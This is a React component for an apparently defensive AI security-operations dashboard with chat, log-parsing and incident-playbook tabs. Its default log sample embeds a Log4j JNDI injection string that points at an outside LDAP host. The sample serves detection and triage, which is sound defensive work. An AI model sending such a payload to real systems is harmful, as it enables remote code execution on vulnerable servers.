import React, { useState, useEffect, useRef } from 'react';
import client from '../api/client';
import {
  Sparkles, Bot, Send, Terminal, Copy, Check, Shield, AlertTriangle,
  FileText, Download, Code, Cpu, RefreshCw, Zap, Search, Activity, Layers, ChevronRight
} from 'lucide-react';

export const AiCopilotPage = () => {
  const [activeTab, setActiveTab] = useState('chat'); // 'chat' | 'log_analysis' | 'playbook'
  const [chatHistory, setChatHistory] = useState([
    {
      sender: 'ai',
      text: "Welcome to **AEGIS AI Security Copilot Studio**! I am your AI-powered Security Analyst & Threat Remediation Assistant.\n\nAsk me any natural language security question, paste raw syslogs/packet captures, or select a preset cyber threat to generate immediate containment steps.",
      prompts: [
        "Explain DoS attack mitigation",
        "Investigate IP 185.220.101.5",
        "Generate Snort rule for Log4j RCE",
        "Explain TCP/IP Transport Layer security"
      ],
      cli: null,
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    }
  ]);

  const [inputMessage, setInputMessage] = useState('');
  const [loading, setLoading] = useState(false);
  const [copiedIndex, setCopiedIndex] = useState(null);

  // Log analysis state
  const [rawLogInput, setRawLogInput] = useState(
    '2026-10-08T14:30:15Z [SNORT-ALERT] [1:1000888:1] (http_inspect) EXPLOIT-KIT Log4j JNDI injection payload ${jndi:ldap://185.220.101.5:1389/Exploit} from 185.220.101.5:48920 to 10.0.0.1:8080'
  );
  const [logAnalysisResult, setLogAnalysisResult] = useState(null);
  const [logLoading, setLogLoading] = useState(false);

  // Playbook generator state
  const [playbookReq, setPlaybookReq] = useState({
    attack_type: 'DoS/DDoS SYN Flood',
    source_ip: '185.220.101.5',
    destination_ip: '10.0.0.1',
    severity: 'HIGH'
  });
  const [playbookResult, setPlaybookResult] = useState(null);
  const [playbookLoading, setPlaybookLoading] = useState(false);

  const messagesEndRef = useRef(null);

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [chatHistory]);

  const handleSendChat = async (queryText) => {
    const query = queryText || inputMessage;
    if (!query.trim()) return;

    const userMsg = {
      sender: 'user',
      text: query,
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    };

    setChatHistory((prev) => [...prev, userMsg]);
    setInputMessage('');
    setLoading(true);

    try {
      const res = await client.post('/advisor/chat', { message: query });
      const aiMsg = {
        sender: 'ai',
        text: res.data.reply,
        prompts: res.data.suggested_prompts || [],
        cli: res.data.cli_command || null,
        engine: res.data.engine_used || 'AEGIS SOC Knowledge Engine',
        timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
      };
      setChatHistory((prev) => [...prev, aiMsg]);
    } catch (err) {
      const errorMsg = {
        sender: 'ai',
        text: "Sorry, I encountered an issue connecting to the AI backend service. Please verify server connection.",
        prompts: ["Try again", "Explain DoS attack mitigation"],
        cli: null,
        timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
      };
      setChatHistory((prev) => [...prev, errorMsg]);
    } finally {
      setLoading(false);
    }
  };

  const handleAnalyzeLog = async () => {
    if (!rawLogInput.trim()) return;
    setLogLoading(true);
    try {
      const res = await client.post('/advisor/log-analysis', { raw_log: rawLogInput });
      setLogAnalysisResult(res.data);
    } catch (err) {
      console.error(err);
    } finally {
      setLogLoading(false);
    }
  };

  const handleGeneratePlaybook = async () => {
    setPlaybookLoading(true);
    try {
      const res = await client.post('/advisor/playbook', playbookReq);
      setPlaybookResult(res.data);
    } catch (err) {
      console.error(err);
    } finally {
      setPlaybookLoading(false);
    }
  };

  const handleCopyText = (text, id) => {
    navigator.clipboard.writeText(text);
    setCopiedIndex(id);
    setTimeout(() => setCopiedIndex(null), 2000);
  };

  const presets = [
    { title: "DoS/DDoS Flood", query: "Explain DoS attack mitigation and show iptables command" },
    { title: "SSH Brute Force", query: "How to block SSH brute force attack on port 22?" },
    { title: "Nmap Port Scan", query: "Investigate port scan from IP 185.220.101.5" },
    { title: "Log4j RCE Exploit", query: "Explain Log4j vulnerability and Snort rule" },
    { title: "FTP Plaintext Risk", query: "Explain FTP security risks and recommended actions" }
  ];

  return (
    <div className="space-y-6 pb-8">
      {/* Header Banner */}
      <div className="bg-gradient-to-r from-slate-900 via-indigo-950/60 to-slate-900 p-6 rounded-2xl border border-indigo-500/30 shadow-2xl flex flex-col md:flex-row items-start md:items-center justify-between gap-4 relative overflow-hidden">
        <div className="absolute top-0 right-0 w-96 h-96 bg-indigo-600/10 rounded-full blur-3xl pointer-events-none"></div>

        <div className="flex items-center gap-4 relative z-10">
          <div className="w-14 h-14 rounded-2xl bg-gradient-to-tr from-blue-600 to-purple-600 border border-blue-400/40 flex items-center justify-center text-white shadow-xl shadow-blue-500/20">
            <Sparkles size={28} className="animate-pulse" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-2xl font-black text-white tracking-tight">AI Security Copilot Studio</h1>
              <span className="px-2.5 py-0.5 rounded-full text-xs font-mono bg-blue-500/20 text-blue-300 border border-blue-500/40 flex items-center gap-1">
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
                SOC AI ACTIVE
              </span>
            </div>
            <p className="text-xs text-slate-300 font-sans mt-1 max-w-xl">
              LLM-Powered Cyber Threat Explanation, Log Forensics, Snort Rule Generator, and NIST-800-61 Incident Playbooks.
            </p>
          </div>
        </div>

        {/* Quick Mode Buttons */}
        <div className="flex items-center gap-2 bg-slate-950/80 p-1.5 rounded-xl border border-slate-800 relative z-10">
          <button
            onClick={() => setActiveTab('chat')}
            className={`px-3.5 py-2 rounded-lg text-xs font-semibold flex items-center gap-2 transition-all ${
              activeTab === 'chat'
                ? 'bg-blue-600 text-white shadow-md shadow-blue-600/30'
                : 'text-slate-400 hover:text-white hover:bg-slate-900'
            }`}
          >
            <Bot size={15} />
            AI Chat Assistant
          </button>
          <button
            onClick={() => setActiveTab('log_analysis')}
            className={`px-3.5 py-2 rounded-lg text-xs font-semibold flex items-center gap-2 transition-all ${
              activeTab === 'log_analysis'
                ? 'bg-blue-600 text-white shadow-md shadow-blue-600/30'
                : 'text-slate-400 hover:text-white hover:bg-slate-900'
            }`}
          >
            <Search size={15} />
            Log & Syslog Parser
          </button>
          <button
            onClick={() => setActiveTab('playbook')}
            className={`px-3.5 py-2 rounded-lg text-xs font-semibold flex items-center gap-2 transition-all ${
              activeTab === 'playbook'
                ? 'bg-blue-600 text-white shadow-md shadow-blue-600/30'
                : 'text-slate-400 hover:text-white hover:bg-slate-900'
            }`}
          >
            <Zap size={15} />
            NIST Playbook Generator
          </button>
        </div>
      </div>

      {/* Main Grid Content */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left Column: Quick Presets & Control Sidebar */}
        <div className="lg:col-span-4 space-y-6">
          {/* Preset Prompts Panel */}
          <div className="bg-[#0B0F19] p-5 rounded-2xl border border-slate-800/80 shadow-xl space-y-4">
            <h3 className="text-sm font-bold text-white flex items-center gap-2">
              <Zap size={16} className="text-amber-400" />
              Preset Threat Scenarios
            </h3>
            <p className="text-xs text-slate-400">Click any preset to launch instant AI security analysis:</p>

            <div className="space-y-2">
              {presets.map((p, idx) => (
                <button
                  key={idx}
                  onClick={() => {
                    setActiveTab('chat');
                    handleSendChat(p.query);
                  }}
                  className="w-full text-left p-3 rounded-xl bg-slate-900/80 hover:bg-slate-800/90 border border-slate-800/90 text-xs text-slate-200 transition-all flex items-center justify-between group"
                >
                  <span className="font-semibold text-blue-300 group-hover:text-blue-200">{p.title}</span>
                  <ChevronRight size={14} className="text-slate-500 group-hover:text-white group-hover:translate-x-1 transition-transform" />
                </button>
              ))}
            </div>
          </div>

          {/* AI Security Capabilities Info */}
          <div className="bg-[#0B0F19] p-5 rounded-2xl border border-slate-800/80 shadow-xl space-y-4">
            <h3 className="text-sm font-bold text-white flex items-center gap-2">
              <Shield size={16} className="text-emerald-400" />
              Copilot AI Capabilities
            </h3>
            <div className="space-y-2.5 text-xs text-slate-300">
              <div className="p-2.5 rounded-lg bg-slate-900/60 border border-slate-800/80 flex items-start gap-2.5">
                <Code size={16} className="text-blue-400 flex-shrink-0 mt-0.5" />
                <div>
                  <h4 className="font-semibold text-white">Rule Generation</h4>
                  <p className="text-[11px] text-slate-400">Generates Linux `iptables`, Windows `Netsh`, and Snort IPS rules.</p>
                </div>
              </div>
              <div className="p-2.5 rounded-lg bg-slate-900/60 border border-slate-800/80 flex items-start gap-2.5">
                <Activity size={16} className="text-purple-400 flex-shrink-0 mt-0.5" />
                <div>
                  <h4 className="font-semibold text-white">IP Telemetry Ingestion</h4>
                  <p className="text-[11px] text-slate-400">Auto-parses IP addresses in queries and cross-references flow database.</p>
                </div>
              </div>
              <div className="p-2.5 rounded-lg bg-slate-900/60 border border-slate-800/80 flex items-start gap-2.5">
                <FileText size={16} className="text-amber-400 flex-shrink-0 mt-0.5" />
                <div>
                  <h4 className="font-semibold text-white">NIST Incident Playbooks</h4>
                  <p className="text-[11px] text-slate-400">Generates containment steps aligned with NIST SP 800-61 guidelines.</p>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Right Column: Tabbed Output Studio */}
        <div className="lg:col-span-8">
          {/* Tab 1: AI Chat Assistant */}
          {activeTab === 'chat' && (
            <div className="bg-[#0B0F19] rounded-2xl border border-slate-800/80 shadow-2xl flex flex-col h-[640px] overflow-hidden">
              {/* Terminal Header */}
              <div className="px-5 py-3.5 bg-slate-900/90 border-b border-slate-800 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <div className="w-3 h-3 rounded-full bg-red-500/80"></div>
                  <div className="w-3 h-3 rounded-full bg-yellow-500/80"></div>
                  <div className="w-3 h-3 rounded-full bg-emerald-500/80"></div>
                  <span className="ml-2 font-mono text-xs text-slate-300 font-semibold">aegis-copilot-terminal --interactive</span>
                </div>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-purple-500/20 text-purple-300 border border-purple-500/30">
                  MODEL: AEGIS-SOC-HYBRID
                </span>
              </div>

              {/* Chat Thread */}
              <div className="flex-1 p-5 space-y-4 overflow-y-auto bg-slate-950/50">
                {chatHistory.map((msg, idx) => (
                  <div key={idx} className={`flex flex-col ${msg.sender === 'user' ? 'items-end' : 'items-start'} space-y-2`}>
                    <div className="flex items-center gap-2 text-[11px] text-slate-400 font-mono">
                      <span>{msg.sender === 'user' ? 'You (Security Analyst)' : 'Aegis AI Copilot'}</span>
                      <span>•</span>
                      <span>{msg.timestamp}</span>
                      {msg.engine && (
                        <span className="px-1.5 py-0.2 rounded text-[9px] bg-slate-800 text-blue-300">{msg.engine}</span>
                      )}
                    </div>

                    <div
                      className={`p-4 rounded-2xl max-w-[90%] leading-relaxed ${
                        msg.sender === 'user'
                          ? 'bg-gradient-to-r from-blue-600 to-indigo-600 text-white rounded-tr-none shadow-lg shadow-blue-600/20 text-sm'
                          : 'bg-slate-900/95 text-slate-100 border border-slate-800 rounded-tl-none shadow-md text-sm'
                      }`}
                    >
                      <p className="whitespace-pre-line leading-relaxed">{msg.text}</p>

                      {/* CLI Command Block */}
                      {msg.cli && (
                        <div className="mt-3 p-3 bg-slate-950 border border-slate-800/90 rounded-xl font-mono text-xs text-emerald-400 flex items-center justify-between gap-3 overflow-x-auto">
                          <div className="flex items-center gap-2 truncate">
                            <Terminal size={15} className="text-slate-500 flex-shrink-0" />
                            <span className="truncate">{msg.cli}</span>
                          </div>
                          <button
                            onClick={() => handleCopyText(msg.cli, idx)}
                            className="px-2.5 py-1 bg-slate-900 hover:bg-slate-800 text-slate-300 hover:text-white rounded border border-slate-700 flex items-center gap-1 text-[11px]"
                          >
                            {copiedIndex === idx ? <Check size={14} className="text-emerald-400" /> : <Copy size={14} />}
                            {copiedIndex === idx ? 'Copied' : 'Copy'}
                          </button>
                        </div>
                      )}
                    </div>

                    {/* Prompts Shortcuts */}
                    {msg.prompts && msg.prompts.length > 0 && (
                      <div className="flex flex-wrap gap-1.5 pt-1 max-w-[90%]">
                        {msg.prompts.map((p, pIdx) => (
                          <button
                            key={pIdx}
                            onClick={() => handleSendChat(p)}
                            className="px-3 py-1 rounded-full bg-slate-900 hover:bg-slate-800 border border-slate-800 text-xs text-blue-300 hover:text-white transition-all font-mono"
                          >
                            ⚡ {p}
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                ))}

                {loading && (
                  <div className="flex items-center gap-2 text-slate-400 font-mono text-xs p-3">
                    <Sparkles className="animate-spin text-blue-400" size={18} />
                    <span>Aegis AI Copilot is analyzing telemetry and formulating response...</span>
                  </div>
                )}
                <div ref={messagesEndRef} />
              </div>

              {/* Input Form */}
              <div className="p-4 bg-slate-900/95 border-t border-slate-800">
                <form
                  onSubmit={(e) => {
                    e.preventDefault();
                    handleSendChat();
                  }}
                  className="flex items-center gap-3"
                >
                  <input
                    type="text"
                    value={inputMessage}
                    onChange={(e) => setInputMessage(e.target.value)}
                    placeholder="Ask Aegis AI about attack vectors, IP investigations, Snort rules..."
                    className="flex-1 px-4 py-3 bg-slate-950 border border-slate-800 rounded-xl text-sm text-white placeholder-slate-500 focus:outline-none focus:border-blue-500"
                  />
                  <button
                    type="submit"
                    disabled={loading || !inputMessage.trim()}
                    className="px-5 py-3 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 disabled:bg-slate-800 text-white font-semibold rounded-xl transition-all shadow-md shadow-blue-600/20 flex items-center gap-2 text-sm"
                  >
                    <Send size={16} />
                    Send
                  </button>
                </form>
              </div>
            </div>
          )}

          {/* Tab 2: Log & Syslog Parser */}
          {activeTab === 'log_analysis' && (
            <div className="bg-[#0B0F19] p-6 rounded-2xl border border-slate-800/80 shadow-2xl space-y-6">
              <div>
                <h3 className="text-lg font-bold text-white flex items-center gap-2">
                  <Search size={20} className="text-blue-400" />
                  AI Raw Log & Payload Parser
                </h3>
                <p className="text-xs text-slate-400 mt-1">
                  Paste raw Snort alerts, syslog entries, HTTP payload strings, or PCAP text to extract entities and generate AI remediation steps.
                </p>
              </div>

              <div className="space-y-3">
                <label className="text-xs font-semibold text-slate-300 font-mono">Raw Log Input Buffer:</label>
                <textarea
                  rows={4}
                  value={rawLogInput}
                  onChange={(e) => setRawLogInput(e.target.value)}
                  className="w-full p-4 bg-slate-950 border border-slate-800 rounded-xl font-mono text-xs text-emerald-300 focus:outline-none focus:border-blue-500"
                  placeholder="Paste syslog or packet capture text here..."
                />
                <button
                  onClick={handleAnalyzeLog}
                  disabled={logLoading || !rawLogInput.trim()}
                  className="px-5 py-2.5 bg-blue-600 hover:bg-blue-500 disabled:bg-slate-800 text-white font-semibold text-xs rounded-xl transition-all shadow-md flex items-center gap-2"
                >
                  {logLoading ? <Sparkles className="animate-spin" size={16} /> : <Search size={16} />}
                  {logLoading ? 'Analyzing Log Payload...' : 'Run AI Log Extraction'}
                </button>
              </div>

              {logAnalysisResult && (
                <div className="p-5 bg-slate-900/90 rounded-xl border border-slate-800 space-y-4 animate-in fade-in-50">
                  <div className="flex items-center justify-between pb-3 border-b border-slate-800">
                    <div className="flex items-center gap-2">
                      <span className="px-2.5 py-1 rounded font-mono text-xs font-bold bg-red-500/20 text-red-400 border border-red-500/40">
                        {logAnalysisResult.threat_level} THREAT
                      </span>
                      <h4 className="font-bold text-white text-base">{logAnalysisResult.detected_attack}</h4>
                    </div>
                  </div>

                  <p className="text-xs text-slate-200 leading-relaxed">{logAnalysisResult.summary}</p>

                  <div className="grid grid-cols-2 gap-4 text-xs font-mono">
                    <div className="p-3 bg-slate-950 rounded-lg border border-slate-800">
                      <span className="text-slate-400">Extracted Source IP:</span>
                      <p className="font-bold text-blue-400 mt-0.5">{logAnalysisResult.extracted_entities.source_ip}</p>
                    </div>
                    <div className="p-3 bg-slate-950 rounded-lg border border-slate-800">
                      <span className="text-slate-400">Extracted Target IP:</span>
                      <p className="font-bold text-emerald-400 mt-0.5">{logAnalysisResult.extracted_entities.destination_ip}</p>
                    </div>
                  </div>

                  <div>
                    <h5 className="text-xs font-bold text-slate-300 uppercase tracking-wider mb-2">Recommended Mitigation Steps:</h5>
                    <ul className="space-y-1.5 text-xs text-slate-300">
                      {logAnalysisResult.remediation_steps.map((step, idx) => (
                        <li key={idx} className="flex items-center gap-2">
                          <span className="w-1.5 h-1.5 rounded-full bg-blue-400"></span>
                          {step}
                        </li>
                      ))}
                    </ul>
                  </div>

                  <div className="p-3 bg-slate-950 border border-slate-800 rounded-xl font-mono text-xs text-emerald-400 flex items-center justify-between">
                    <span>{logAnalysisResult.suggested_firewall_cmd}</span>
                    <button
                      onClick={() => handleCopyText(logAnalysisResult.suggested_firewall_cmd, 'log_cmd')}
                      className="text-slate-400 hover:text-white p-1 hover:bg-slate-800 rounded"
                    >
                      {copiedIndex === 'log_cmd' ? <Check size={14} className="text-emerald-400" /> : <Copy size={14} />}
                    </button>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* Tab 3: NIST Playbook Generator */}
          {activeTab === 'playbook' && (
            <div className="bg-[#0B0F19] p-6 rounded-2xl border border-slate-800/80 shadow-2xl space-y-6">
              <div>
                <h3 className="text-lg font-bold text-white flex items-center gap-2">
                  <Zap size={20} className="text-amber-400" />
                  NIST-800-61 Incident Playbook Generator
                </h3>
                <p className="text-xs text-slate-400 mt-1">
                  Generate structured SOAR containment playbooks aligned with NIST SP 800-61 Rev 2 guidelines.
                </p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div>
                  <label className="text-xs font-semibold text-slate-400">Attack Type:</label>
                  <input
                    type="text"
                    value={playbookReq.attack_type}
                    onChange={(e) => setPlaybookReq({ ...playbookReq, attack_type: e.target.value })}
                    className="w-full mt-1 p-2.5 bg-slate-950 border border-slate-800 rounded-lg text-xs text-white"
                  />
                </div>
                <div>
                  <label className="text-xs font-semibold text-slate-400">Attacker Source IP:</label>
                  <input
                    type="text"
                    value={playbookReq.source_ip}
                    onChange={(e) => setPlaybookReq({ ...playbookReq, source_ip: e.target.value })}
                    className="w-full mt-1 p-2.5 bg-slate-950 border border-slate-800 rounded-lg text-xs text-white font-mono"
                  />
                </div>
                <div>
                  <label className="text-xs font-semibold text-slate-400">Target IP:</label>
                  <input
                    type="text"
                    value={playbookReq.destination_ip}
                    onChange={(e) => setPlaybookReq({ ...playbookReq, destination_ip: e.target.value })}
                    className="w-full mt-1 p-2.5 bg-slate-950 border border-slate-800 rounded-lg text-xs text-white font-mono"
                  />
                </div>
              </div>

              <button
                onClick={handleGeneratePlaybook}
                disabled={playbookLoading}
                className="px-5 py-2.5 bg-indigo-600 hover:bg-indigo-500 disabled:bg-slate-800 text-white font-semibold text-xs rounded-xl transition-all shadow-md flex items-center gap-2"
              >
                {playbookLoading ? <Sparkles className="animate-spin" size={16} /> : <Zap size={16} />}
                {playbookLoading ? 'Generating Playbook...' : 'Generate NIST Playbook'}
              </button>

              {playbookResult && (
                <div className="p-5 bg-slate-900/90 rounded-xl border border-slate-800 space-y-5 animate-in fade-in-50">
                  <div className="border-b border-slate-800 pb-3">
                    <h4 className="font-bold text-lg text-white">{playbookResult.title}</h4>
                    <span className="text-xs font-mono text-blue-400">{playbookResult.nist_stage}</span>
                  </div>

                  <p className="text-xs text-slate-300 leading-relaxed">{playbookResult.summary}</p>

                  {/* Containment Commands */}
                  <div>
                    <h5 className="text-xs font-bold text-slate-300 uppercase tracking-wider mb-2">Automated Containment CLI:</h5>
                    <div className="space-y-2">
                      {playbookResult.containment_cli.map((cliItem, idx) => (
                        <div key={idx} className="p-3 bg-slate-950 border border-slate-800 rounded-lg flex items-center justify-between font-mono text-xs text-emerald-400">
                          <div>
                            <span className="text-[10px] text-slate-400 block">{cliItem.label}:</span>
                            <span>{cliItem.command}</span>
                          </div>
                          <button
                            onClick={() => handleCopyText(cliItem.command, `pb_${idx}`)}
                            className="text-slate-400 hover:text-white p-1 hover:bg-slate-800 rounded"
                          >
                            {copiedIndex === `pb_${idx}` ? <Check size={14} className="text-emerald-400" /> : <Copy size={14} />}
                          </button>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default AiCopilotPage;
